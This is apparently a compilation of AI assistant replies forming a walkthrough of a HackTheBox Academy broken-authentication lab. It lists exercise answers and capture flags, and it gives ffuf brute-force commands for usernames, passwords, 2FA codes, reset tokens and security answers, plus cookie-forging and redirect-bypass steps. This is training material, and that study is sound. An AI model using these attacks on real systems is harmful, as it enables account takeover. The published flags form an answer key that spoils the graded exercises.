Here is a complete, formatted markdown file containing all the solutions and the skills assessment walkthrough. You can copy and paste this directly into your Medium article editor.

***

# HackTheBox Academy: Broken Authentication - Complete Solutions & Walkthrough

In this article, we cover the complete solutions for the **Broken Authentication** module on HackTheBox Academy. We will start with the solutions to all the section exercises and conclude with a comprehensive walkthrough of the final Skills Assessment.

## Section Exercise Solutions

**1. Enumerate a valid user on the web application. Provide the username as the answer.**
*(Target: Authenticate with user "htb-stdnt" and password "Academy_student!")*
**Answer:** `cookster`

**2. What is one prominent issue with passwords?**
**Answer:** `Password reuse`

**3. What is the password of the user 'admin'?**
**Answer:** `Ramirez120992`

**4. On what do password recovery functionalities provided by web applications typically rely to allow users to recover their accounts?**
**Answer:** `one-time reset token`

**5. Which flag of seq pads numbers by prepending zeros to make them the same length?**
**Answer:** `-w`

**6. How many possible values are there for a 6-digit OTP?**
**Answer:** `1000000`

**7. Takeover another user's account on the target system to obtain the flag.**
**Answer:** `HTB{36da098385e641d54e1b2750721d816e}`

**8. Brute-force the admin user's 2FA code on the target system to obtain the flag.**
*(Target: Authenticate with user "admin" and password "admin")*
**Answer:** `HTB{9837b33a1ef678c380addf7ef8a517de}`

**9. Which city is the admin user from?**
**Answer:** `Manchester`

**10. Reset the admin user's password on the target system to obtain the flag.**
**Answer:** `HTB{d4740b1801d9880ff70de227a54309f0}`

**11. Apply what you learned in this section to bypass authentication to obtain the flag.**
*(Authentication Bypass via Direct Access)*
**Answer:** `HTB{913ab2d84b8db21854c696dee1f1db68}`

**12. Apply what you learned in this section to bypass authentication to obtain the flag.**
*(Authentication Bypass via Parameter Modification)*
*(Target: Authenticate with user "htb-stdnt" and password "AcademyStudent!")*
**Answer:** `HTB{63593317426484ea6d270c2159335780}`

**13. A session token can be brute-forced if it lacks sufficient what?**
**Answer:** `Entropy`

**14. Obtain administrative access on the target to obtain the flag.**
*(Attacking Session Tokens)*
*(Target: Authenticate with user "htb-stdnt" and password "AcademyStudent!")*
**Answer:** `HTB{d1f5d760d130f7dd11de93f0b393abda}`

---

## Skills Assessment Walkthrough

**Scenario:** You are tasked with performing a security assessment of a client’s web application (MetaDocs). The client has not provided you with credentials. Apply what you have learned in this module to obtain the flag.

**Target:** `http://<IP>:PORT` - MetaDocs web application

### Vulnerabilities Found & Exploited

#### 1. Username Enumeration (Information Disclosure)
The login page returns different error messages depending on whether a username exists:
*   **Existing user, wrong password:** "Invalid credentials." (response size: 4344)
*   **Non-existing user:** "Unknown username or password." (response size: 4353)

We used `ffuf` to enumerate usernames from the `xato-net-10-million-usernames` wordlist, filtering by response size. 

*Important: The password in the request had to match the password policy, otherwise the server responded differently.*

```bash
ffuf -w xato-usernames.txt -u http://TARGET/login.php -X POST \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "username=FUZZ&password=Testpass12345" -fs 4353
```
**Found user:** `gladys`

#### 2. Weak Password Policy -> Password Brute-Force
The password policy (exactly 12 chars, upper+lower+digits, NO special chars) actually reduces the keyspace. We filtered `rockyou.txt` from 14 million passwords down to about 17,000:

```bash
grep '[[:upper:]]' rockyou.txt | grep '[[:lower:]]' | grep '[[:digit:]]' \
  | grep -E '^.{12}$' | grep -E '^[a-zA-Z0-9]+$' > custom_exact12.txt
```

Then brute-forced the login with `ffuf`:

```bash
ffuf -w custom_exact12.txt -u http://TARGET/login.php -X POST \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "username=gladys&password=FUZZ" -fr "Invalid credentials"
```
**Found password:** `dWinaldasD13`

#### 3. 2FA Bypass via Direct Access (Authentication Bypass)
After logging in, the `gladys` account gets redirected to `2fa.php` for OTP verification. However, accessing `profile.php` directly returns a `302` redirect to `2fa.php` but the response body still contains the full page content, including the flag. The server renders the protected page before enforcing the redirect — a classic authentication bypass.

First, we log in to get a valid session:

```bash
SESSION=$(curl -s -i -X POST http://TARGET/login.php \
  -d "username=gladys&password=dWinaldasD13" | \
  grep "Set-Cookie: PHPSESSID" | head -1 | cut -d'=' -f2 | cut -d';' -f1)
```

Then, we access `profile.php` directly using that session:

```bash
curl -s -b "PHPSESSID=$SESSION" http://TARGET/profile.php
```
The response body contained the final flag.

### Final Flag
**Answer:** `HTB{d86115e037388d0fa29280b737fd9171}`

---------------------------------------------------

To obtain the flag, you need to brute-force the 4-digit 2FA code (OTP) using `ffuf`. Since the valid code will authorize your session, subsequent requests will redirect to the admin dashboard. 

Here are the exact steps to accomplish this on your target instance:

### Step 1: Log in and Capture the Session Cookie
1. Open your browser and navigate to `http://<TARGET_IP>:<PORT>/index.php`.
2. Log in using the provided credentials:
   - **Username:** `admin`
   - **Password:** `admin`
3. You will be redirected to the 2FA page (`/2fa.php`). 
4. Open your browser's Developer Tools (Press `F12`), go to the **Application** (or **Storage**) tab, and look under **Cookies**. 
5. Find and copy the value of the `PHPSESSID` cookie. You will need this for `ffuf`.

### Step 2: Create the Wordlist
If you haven't already, generate a wordlist containing all possible 4-digit combinations (from `0000` to `9999`) with zero padding using `seq`:
```bash
seq -w 0 9999 > tokens.txt
```

### Step 3: Brute-Force the 2FA Code
Now, use `ffuf` to brute-force the `otp` POST parameter. Make sure to replace `<TARGET_IP>`, `<PORT>`, and `<YOUR_PHPSESSID>` with your actual target details and the cookie you copied in Step 1.

```bash
ffuf -w ./tokens.txt -u http://<TARGET_IP>:<PORT>/2fa.php -X POST -H "Content-Type: application/x-www-form-urlencoded" -b "PHPSESSID=<YOUR_PHPSESSID>" -d "otp=FUZZ" -fr "Invalid 2FA Code"
```

*Note: As the module text mentions, you will likely see multiple hits because once the correct code is submitted, your session becomes authenticated and all subsequent requests result in a `302` redirect instead of the "Invalid 2FA Code" error. The **first** hit in the `FUZZ` column is the correct 2FA code.*

### Step 4: Access the Admin Dashboard
Since your session cookie is now fully authenticated (the server marked it as passing 2FA), you can simply navigate to the admin dashboard in your browser:

1. Go to `http://<TARGET_IP>:<PORT>/admin.php` in your browser.
2. Because your browser still holds the authenticated `PHPSESSID` cookie, you will bypass the 2FA prompt and load the admin dashboard.
3. Look through the dashboard to find the flag and submit it!

-----------------------------------------------------------

Here are the answers to your questions and the steps to obtain the flag:

### 1. On what do password recovery functionalities provided by web applications typically rely to allow users to recover their accounts?
**A one-time reset token** (which is transmitted to the user via SMS or email).

### 2. Which flag of seq pads numbers by prepending zeros to make them the same length?
**`-w`**

### 3. Takeover another user's account on the target system to obtain the flag.
To take over another user's account (typically the `admin` user) and get the flag, you need to brute-force the 4-digit reset token. 

Here are the exact steps to do this on your target instance:

#### Step 1: Create the Token Wordlist
Generate a wordlist containing all possible 4-digit combinations (from `0000` to `9999`) with padding using `seq`:
```bash
seq -w 0 9999 > tokens.txt
```

#### Step 2: Request a Password Reset for 'admin'
1. Open your browser and navigate to your target's password reset page (e.g., `http://<TARGET_IP>:<PORT>/reset.php`).
2. Enter `admin` as the username and submit the form. This ensures that an active reset token is currently pending for the `admin` account.

#### Step 3: Brute-Force the Reset Token
Now, use `ffuf` to brute-force the `token` GET parameter. We will filter out the responses containing the invalid token error message to find the valid one:

```bash
ffuf -w ./tokens.txt -u "http://<TARGET_IP>:<PORT>/reset_password.php?token=FUZZ" -fr "The provided token is invalid"
```

*Once `ffuf` finds the correct token, it will display it in the `FUZZ` column (e.g., `6182`).*

#### Step 4: Reset the Password and Log In
1. Take the valid token found by `ffuf` and navigate to the reset URL in your browser:
   `http://<TARGET_IP>:<PORT>/reset_password.php?token=<VALID_TOKEN>`
2. You should see the message "Hello admin, please reset your password." 
3. Enter a new password of your choice and submit it.
4. Go to the login page (`/index.php`), log in with the username `admin` and your new password, and retrieve the flag from the admin dashboard!

-----------------------------------------------------

That warning is completely normal and nothing to worry about! The `rockyou.txt` file contains some non-ASCII/foreign characters, which causes `awk` to throw that warning. However, it still processes the rest of the file perfectly fine.

You can verify that your wordlist was successfully created by running:
```bash
wc -l custom_wordlist.txt
```
*It should output around `151647` words.*

Once you confirm the file has words in it, you are ready to run the brute-force attack! Just run your `ffuf` command again:

```bash
ffuf -w ./custom_wordlist.txt -u http://154.57.164.82:32615/index.php -X POST -H "Content-Type: application/x-www-form-urlencoded" -d "username=admin&password=FUZZ" -fr "Invalid username"
```

It might take a minute or two to run through the ~150,000 passwords, but once it finds the correct one, it will pop up in the `FUZZ` column with a `302` status code. Copy that password and submit it as the answer!

------------------------------------------------------------

It looks like the `rockyou-75.txt` file you used only contained a tiny handful of passwords that matched the criteria (only 8 words were tested). To get the full list of potential passwords, you need to extract the complete `rockyou.txt` database and use that to generate your custom wordlist. 

Here are the exact steps to extract the full `rockyou.txt` list, generate a proper custom wordlist, and run the brute-force attack successfully:

### Step 1: Copy and Extract the Full `rockyou.txt` Database
Run these commands in your terminal to copy the compressed file to your home directory and extract it:

```bash
cd ~
cp /opt/useful/seclists/Passwords/Leaked-Databases/rockyou.txt.tar.gz .
tar -xzvf rockyou.txt.tar.gz
```
*This will extract the full `rockyou.txt` file containing all 14 million passwords into your home directory.*

### Step 2: Generate the Custom Wordlist
Now, run the `awk` command on the fully extracted `rockyou.txt` file to filter it down to only passwords that match the password policy (>= 10 characters, upper, lower, and a digit):

```bash
awk 'length($0) >= 10 && /[a-z]/ && /[A-Z]/ && /[0-9]/' rockyou.txt > custom_wordlist.txt
```
*You can verify it worked by running `wc -l custom_wordlist.txt`. It should output around `151647` words.*

### Step 3: Run the Brute-Force Attack
Now run your `ffuf` command again. It will take a bit longer this time because it is testing ~150,000 passwords instead of 8, but it will find the correct password for the `admin` user:

```bash
ffuf -w ./custom_wordlist.txt -u http://154.57.164.82:32615/index.php -X POST -H "Content-Type: application/x-www-form-urlencoded" -d "username=admin&password=FUZZ" -fr "Invalid username"
```

Once `ffuf` finds the correct password, it will display it in the `FUZZ` column (it will be the only result with a `302` status code). Submit that password as the answer!

------------------------------------------------------------------

You are getting the `Permission denied` error because you are currently inside the `/opt/useful/seclists/Passwords/Leaked-Databases/` directory, which is a system-owned read-only directory. You cannot create or save new files (like `custom_wordlist.txt`) in that folder.

Additionally, when you use `sudo` with an output redirect (`>`), the redirect itself is handled by your non-root shell *before* the `sudo` command runs, which is why `sudo` doesn't bypass the permission denied error.

To fix this, you need to navigate to your home directory (or `/tmp`) where you have write permissions, and run the command there. 

Also, based on your `ls` output, `rockyou.txt` is compressed (`rockyou.txt.tar.gz`). You can either extract it, or just use one of the pre-split chunks like `rockyou-75.txt` (which contains the most common passwords and will be much faster).

Here are the exact steps to fix it:

### Step 1: Go to your home directory
```bash
cd ~
```

### Step 2: Create the custom wordlist
Run the `awk` command pointing to the `rockyou-75.txt` file (to save time) and save the output to your current directory:
```bash
awk 'length($0) >= 10 && /[a-z]/ && /[A-Z]/ && /[0-9]/' /opt/useful/seclists/Passwords/Leaked-Databases/rockyou-75.txt > custom_wordlist.txt
```

### Step 3: Run ffuf
Now you can run `ffuf` using the `custom_wordlist.txt` you just created in your home directory. *(Remember to replace `<TARGET_IP>` and `<PORT>` with your actual target IP and Port)*:

```bash
ffuf -w ./custom_wordlist.txt -u http://<TARGET_IP>:<PORT>/index.php -X POST -H "Content-Type: application/x-www-form-urlencoded" -d "username=admin&password=FUZZ" -fr "Invalid username"
```

Once `ffuf` finds the correct password, it will display it in the `FUZZ` column!

---------------------------------------------------------------

Here are the answers and steps for your questions:

### 1. A session token can be brute-forced if it lacks sufficient what?
**Entropy** (or **randomness**)

### 2. Obtain administrative access on the target to obtain the flag.
To get the flag, you need to forge an administrative session cookie by decoding the current session token, changing your role to `admin`, and encoding it back. The module text provides two examples of how the cookie might be encoded (Base64 or Hex). You will need to try these against your specific target instance.

Here are the exact steps to achieve this:

#### Step 1: Log in and Capture the Session Cookie
1. Open your browser and navigate to `http://154.57.164.77/index.php`.
2. Log in using the provided credentials:
   - **Username:** `htb-stdnt`
   - **Password:** `AcademyStudent!`
3. Once logged in, open your browser's Developer Tools (Press `F12`), go to the **Application** (or **Storage**) tab, and look under **Cookies** for `http://154.57.164.77`.
4. Find the cookie named `session` and copy its value. 

#### Step 2: Decode the Cookie
The cookie value will be a long string. You need to determine if it is Base64 or Hex encoded and decode it.

**If it looks like Base64** (ends in `=` or contains uppercase/lowercase letters and numbers):
Run this command in your terminal, replacing `<COOKIE_VALUE>` with your actual cookie:
```bash
echo -n "<COOKIE_VALUE>" | base64 -d
```
*If successful, it will output something like: `user=htb-stdnt;role=user`*

**If it looks like Hex** (only contains numbers 0-9 and letters a-f):
Run this command:
```bash
echo -n "<COOKIE_VALUE>" | xxd -r -p
```

#### Step 3: Forge the Admin Cookie
Now that you have the decoded string (e.g., `user=htb-stdnt;role=user`), change the `role` value from `user` to `admin`. 

Encode the modified string back into its original format:

**To encode in Base64:**
```bash
echo -n 'user=htb-stdnt;role=admin' | base64
```
*(Output example: `dXNlcj1odGItc3RkbnQ7cm9sZT1hZG1pbg==`)*

**To encode in Hex:**
```bash
echo -n 'user=htb-stdnt;role=admin' | xxd -p
```
*(Output example: `757365723d6874622d7374646e743b726f6c653d61646d696e`)*

#### Step 4: Replace the Cookie and Get the Flag
1. Go back to your browser's Developer Tools -> Cookies.
2. Double-click the `Value` of the `session` cookie and replace it with your newly forged encoded string.
3. After updating the cookie, navigate to `http://154.57.164.77/admin.php` in your browser.
4. Because the application trusts the tampered cookie, you will be granted administrative access, and the flag will be displayed on the dashboard. Submit this flag to complete the exercise.

---------------------------------------------

To solve this exercise, you need to brute-force the `user_id` parameter to find the ID associated with an administrator account. Once you find the correct ID, you can access the admin dashboard and retrieve the flag.

Here are the step-by-step instructions to accomplish this:

### Step 1: Generate a Wordlist of User IDs
Since user IDs are typically numeric, we can quickly generate a wordlist of numbers using the `seq` command in your terminal. Let's generate numbers from 1 to 500 to start:

```bash
seq 1 500 > user_ids.txt
```

### Step 2: Brute-Force the `user_id` Parameter
We will use `ffuf` to fuzz the `user_id` parameter in the URL. We want to filter out the responses that contain the error message "Please check your privileges" so that only successful admin access is returned.

Run the following command (replace `<TARGET_IP>` and `<PORT>` with your actual target details):

```bash
ffuf -w ./user_ids.txt -u "http://<TARGET_IP>:<PORT>/admin.php?user_id=FUZZ" -fr "Please check your privileges"
```

*Note: If `ffuf` returns no results, try increasing the number range in your wordlist (e.g., `seq 1 2000 > user_ids.txt`) and run the command again.*

### Step 3: Identify the Admin User ID
Once `ffuf` finds the correct ID, it will display it in the `FUZZ` column (for example, it might find `1` or `42`). 

### Step 4: Access the Admin Dashboard
1. Open your web browser.
2. Navigate to the admin page using the ID discovered by `ffuf`. For example, if `ffuf` found `1`, go to:
   `http://<TARGET_IP>:<PORT>/admin.php?user_id=1`
3. The page should now load successfully without the privilege error, displaying the full admin dashboard.
4. Look through the dashboard statistics or text on the page to find the dynamically generated flag. Submit this flag to complete the exercise.

-------------------------------------------------------

To obtain the flag, you need to follow the exact technique described in the module text using a web proxy like Burp Suite. Here are the step-by-step instructions to bypass the authentication and get the flag:

### Step 1: Configure Burp Suite
1. Open Burp Suite and ensure your browser is configured to proxy traffic through it (usually `127.0.0.1:8080`).
2. Go to the **Proxy** tab, then the **Intercept** sub-tab, and click **Intercept is on** to enable interception.

### Step 2: Intercept the Request
1. In your web browser, attempt to directly access the protected admin endpoint mentioned in the text: `http://<SERVER_IP>:<PORT>/admin.php` (replace with your actual target IP and Port).
2. Burp Suite will intercept the outgoing HTTP request.

### Step 3: Intercept the Response
1. In Burp Suite, right-click anywhere inside the intercepted request window.
2. From the context menu, select **Do intercept** -> **Response to this request**.
3. Click the **Forward** button located at the bottom left of Burp Suite. 
4. Burp will now capture the server's response instead of sending it straight to the browser.

### Step 4: Modify the Status Code
1. Look at the very first line of the intercepted response. It will say something like `HTTP/1.1 302 Found`.
2. Change `302 Found` to `200 OK`. This tricks your browser into thinking it received a normal page rather than a redirect.
3. Click the **Forward** button again to send the modified response to your browser.

### Step 5: Retrieve the Flag
1. Go back to your web browser. Instead of redirecting you to the login page, the browser will now render the hidden HTML content of the admin dashboard that was included in the response body.
2. Look through the rendered dashboard for the flag (usually located in the page text, a comment, or a dashboard widget). Copy that flag and submit it to complete the exercise!

-----------------------------------------------------

You are absolutely right. The module text uses **Houston** as an *example* of a successful brute-force result, but the actual target system assigned to you will have a **different** city set as the answer for the `admin` user. 

To find the correct city and obtain the flag for your specific target instance, you need to perform the brute-force attack yourself. Here are the exact steps to do it:

### Step 1: Download and Prepare the Wordlist
First, you need to download the CSV file mentioned in the text and extract just the city names into a wordlist. Run these commands in your HTB Academy terminal:

```bash
# Download the world cities CSV
wget https://raw.githubusercontent.com/datasets/world-cities/master/data/world-cities.csv

# Extract the first column (city names) into a new wordlist
cat world-cities.csv | cut -d ',' -f1 > city_wordlist.txt
```

### Step 2: Start the Password Reset Process for 'admin'
1. Open your target IP in your browser: `http://<TARGET_IP>:<PORT>/reset.php`
2. Enter `admin` as the username and submit the form.
3. You will be taken to the security question page (`security_question.php`) asking "What city were you born in?".
4. Open your browser's Developer Tools (Press `F12`), go to the **Network** tab, and refresh the page. Alternatively, look at your browser's cookies.
5. Find and copy your `PHPSESSID` cookie value. You will need this for `ffuf` so the server knows you are trying to reset the `admin` user.

### Step 3: Brute-Force the Security Question
Now, use `ffuf` to brute-force the answer using the wordlist you created and your session cookie. Replace `<TARGET_IP>`, `<PORT>`, and `<YOUR_PHPSESSID>` with your actual details:

```bash
ffuf -w ./city_wordlist.txt -u http://<TARGET_IP>:<PORT>/security_question.php -X POST -H "Content-Type: application/x-www-form-urlencoded" -b "PHPSESSID=<YOUR_PHPSESSID>" -d "security_response=FUZZ" -fr "Incorrect response."
```

*Note: The `-fr "Incorrect response."` flag tells `ffuf` to filter out the default failed responses. When `ffuf` finds the correct city, it will output a `302` redirect status and display the correct city name under the `FUZZ` column.*

### Step 4: Answer the Question and Reset the Password
1. Go back to your browser where the security question page is open.
2. Type in the city discovered by `ffuf` and click Submit.
3. You will be redirected to the password reset page (`reset_password.php`).
4. Enter a new password (e.g., `HackTheBox123!`) and submit it.

### Step 5: Log in and Get the Flag
1. Go to the login page of the web application.
2. Log in using the username `admin` and the new password you just set.
3. Once logged in, look around the dashboard/profile pages. The flag will be displayed on the screen.

Submit that flag into the HTB Academy question box to complete the exercise!

--------------------------------------------------

